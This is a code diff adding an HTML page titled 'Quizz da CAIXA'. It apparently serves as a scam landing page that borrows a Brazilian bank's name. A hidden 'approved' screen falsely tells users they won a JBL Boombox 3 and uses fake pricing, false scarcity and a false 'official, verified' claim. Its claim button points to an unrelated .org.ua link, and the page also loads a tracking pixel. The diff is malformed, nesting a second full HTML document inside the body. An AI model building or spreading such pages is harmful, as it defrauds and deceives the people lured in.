@@ -25,5 +25,160 @@
 <body>
   <div id="root"></div>
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <link rel="icon" type="image/png" href="images/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Quizz da CAIXA</title>
+  <meta property="og:image" content="images/og_default.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://bolt.new/static/og_default.png">
 
+  <link rel="stylesheet" href="css/latest.css">
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  <script>
+    window.pixelId = "691f34c20b1a6b971219b761";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  <script type="module" crossorigin="" src="js/index-YV8y5R8t.js"></script>
+  <link rel="stylesheet" crossorigin="" href="css/index-DPYpGUHT.css">
+
+  <style>
+    /* CSS para a tela de APROVADO */
+    #aprovadoPage {
+      display: none;
+      margin: 0;
+      padding: 0;
+      background: #0f1c30;
+      font-family: Arial, sans-serif;
+      width: 100%;
+      min-height: 100vh;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 999999;
+      justify-content: center;
+      align-items: center;
+    }
+    #aprovadoPage .card {
+      background: #fff;
+      width: 90%;
+      max-width: 420px;
+      border-radius: 18px;
+      padding: 20px;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+      animation: fadeIn 0.8s ease;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    #aprovadoPage .status {
+      background: #1cb246;
+      padding: 12px;
+      border-radius: 12px;
+      color: #fff;
+      font-size: 20px;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+    #aprovadoPage h2 {
+      color: #ff5b2e;
+      font-size: 24px;
+      margin-top: 0;
+    }
+    #aprovadoPage .benefits {
+      display: flex;
+      justify-content: space-between;
+      margin: 20px 0;
+    }
+    #aprovadoPage .benefit {
+      background: #f6f6f6;
+      width: 30%;
+      padding: 10px;
+      border-radius: 10px;
+      font-size: 13px;
+      font-weight: bold;
+    }
+    #aprovadoPage .price-old {
+      text-decoration: line-through;
+      color: #888;
+      font-size: 16px;
+    }
+    #aprovadoPage .price-new {
+      font-size: 38px;
+      font-weight: bold;
+      color: #d62828;
+      margin-top: -8px;
+    }
+    #aprovadoPage .warning {
+      color: #d62828;
+      font-size: 14px;
+      margin-top: -10px;
+      font-weight: bold;
+    }
+    #aprovadoPage .button {
+      margin-top: 20px;
+      background: #1cb246;
+      color: #fff;
+      padding: 15px;
+      border-radius: 12px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-block;
+      animation: bounce 1.3s infinite;
+    }
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-6px); }
+    }
+    #aprovadoPage .footer {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #777;
+    }
+  </style>
+
+</head>
+
+<body>
+  <div id="root">
+    </div>
+
+  <div id="aprovadoPage">
+    <div class="card">
+      <div class="status">✔ APROVADO COM SUCESSO!</div>
+      <h2>🎉 PARABÉNS!<br>VOCÊ ACABOU DE GANHAR SUA JBL BOOMBOX 3!</h2>
+      <p>Sua resposta foi selecionada entre milhares. Essa máquina de som agora é SUA.</p>
+      <div class="benefits">
+        <div class="benefit">🔊 GRAVE PESADO</div>
+        <div class="benefit">📢 VOLUME ABSURDO</div>
+        <div class="benefit">🔋 24H AUTONOMIA</div>
+      </div>
+      <div class="price-old">R$ 799,90</div>
+      <div class="price-new">R$ 0,00</div>
+      <div class="warning">⚠ RESTAM APENAS 1 UNIDADE</div>
+      <a class="button" href="https://compraseguraonline.org.ua/c/b296678be9">RESGATAR MEU PRÊMIO — R$0,00 →</a>
+      <div class="footer">🔒 Site seguro e oficial. Promoção verificada.</div>
+    </div>
+  </div>
+
+  <script>
+    function showAprovado(){
+      document.getElementById("root").style.display="none";
+      document.getElementById("aprovadoPage").style.display="flex";
+    }
+    // Lembre-se de chamar a função 'showAprovado()' dentro do seu quiz (ou no script 'js/index-YV8y5R8t.js') quando a transição for necessária.
+  </script>
+</body>
+</html>  
 </body></html>
